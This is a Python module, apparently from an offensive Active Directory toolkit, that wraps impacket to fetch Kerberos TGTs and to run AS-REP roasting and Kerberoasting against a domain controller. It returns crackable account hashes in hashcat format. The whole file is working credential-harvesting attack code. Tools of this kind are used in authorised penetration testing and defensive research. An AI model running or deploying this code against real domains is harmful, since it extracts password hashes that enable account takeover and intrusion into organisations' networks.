"""Kerberos client — wrappers around impacket for AS-REQ and TGS-REQ."""
from __future__ import annotations

import asyncio
import logging
import shutil
import tempfile
from pathlib import Path

log = logging.getLogger("forge.adforge.kerberos")


class KerberosClient:
    """Thin async wrapper over impacket Kerberos operations."""

    def __init__(self, domain: str, dc_ip: str, username: str = "", password: str = "", nt_hash: str = "") -> None:
        self.domain   = domain
        self.dc_ip    = dc_ip
        self.username = username
        self.password = password
        self.nt_hash  = nt_hash

    async def get_tgt(self) -> bytes | None:
        try:
            from impacket.krb5.kerberosv5 import getKerberosTGT
            from impacket.krb5 import constants
            from impacket.krb5.types import Principal
            user_principal = Principal(self.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
            tgt, cipher, _, session_key = getKerberosTGT(
                user_principal, self.password, self.domain, "", self.nt_hash, "", self.dc_ip
            )
            return tgt
        except ImportError:
            log.warning("impacket not installed")
            return None
        except Exception as exc:
            log.debug("TGT failed: %s", exc)
            return None

    async def get_np_users(self) -> list[str]:
        """AS-REP roast — get hashes for accounts without pre-auth."""
        script = shutil.which("GetNPUsers.py") or shutil.which("impacket-GetNPUsers")
        if not script:
            log.warning("GetNPUsers.py not found")
            return []
        cmd = [script, f"{self.domain}/", "-dc-ip", self.dc_ip, "-no-pass", "-request", "-format", "hashcat"]
        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=60)
            return [line for line in stdout.decode().splitlines() if line.startswith("$krb5asrep$")]
        except Exception as exc:
            log.debug("GetNPUsers failed: %s", exc)
            return []

    async def get_spn_hashes(self, users: list[str] | None = None) -> list[str]:
        """Kerberoast — request TGS tickets for SPN accounts."""
        script = shutil.which("GetUserSPNs.py") or shutil.which("impacket-GetUserSPNs")
        if not script:
            log.warning("GetUserSPNs.py not found")
            return []
        cred = f"{self.domain}/{self.username}:{self.password}" if self.password else f"{self.domain}/{self.username}"
        with tempfile.NamedTemporaryFile(suffix="_spn_hashes.txt", delete=False) as tmp:
            out_file = tmp.name
        cmd = [script, cred, "-dc-ip", self.dc_ip, "-request", "-outputfile", out_file]
        if self.nt_hash:
            cmd += ["-hashes", f":{self.nt_hash}"]
        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=120)
            return [line for line in stdout.decode().splitlines() if line.startswith("$krb5tgs$")]
        except Exception as exc:
            log.debug("GetUserSPNs failed: %s", exc)
            return []
        finally:
            Path(out_file).unlink(missing_ok=True)
